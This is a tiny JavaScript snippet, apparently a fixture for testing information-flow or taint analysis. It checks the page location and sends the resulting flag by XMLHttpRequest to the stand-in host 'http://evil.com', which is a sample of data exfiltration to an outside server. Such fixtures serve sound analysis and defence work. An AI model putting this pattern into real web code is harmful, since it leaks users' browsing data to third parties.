var p = document.location;
var TopString = (45).toString(12);
document.location.href = TopString;
var mes = 0;
var x = new XMLHttpRequest();
x.open("GET", "http://evil.com");
if (document.location.href == "www.foo.com") {
	mes = 1;
}
x.send(mes);